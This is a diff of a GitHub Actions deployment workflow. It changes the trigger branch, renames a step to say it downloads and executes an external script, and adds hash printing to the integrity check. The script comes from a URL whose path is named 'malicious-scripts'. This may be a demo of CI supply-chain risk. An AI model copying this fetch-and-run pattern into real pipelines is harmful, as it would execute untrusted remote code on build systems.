@@ -3,7 +3,7 @@ name: Secure Deployment
 on:  
   push:  
     branches:  
-      - main  
+      - secure
 
 jobs:  
   deploy:  
@@ -13,7 +13,7 @@ jobs:
       - name: Checkout Repository  
         uses: actions/checkout@v3  
 
-      - name: Download Deployment Script (With Hash Verification)  
+      - name: Download and Execute External Script (With Hash Verification)  
         run: |  
           DEPLOY_URL="https://linustimodaniels.github.io/malicious-scripts/deploy.sh"  
           EXPECTED_HASH="5128CDD384A2E90BCCDA2D1D39D7BEB27696E5045534B4396B4BDB2C16F4338D"
@@ -25,6 +25,8 @@ jobs:
           ACTUAL_HASH=$(sha256sum deploy.sh | awk '{print $1}')  
           if [[ "$ACTUAL_HASH" != "$EXPECTED_HASH" ]]; then  
             echo "ERROR: File integrity check failed!"  
+            echo $ACTUAL_HASH
+            echo $EXPECTED_HASH
             exit 1  
           fi  
 
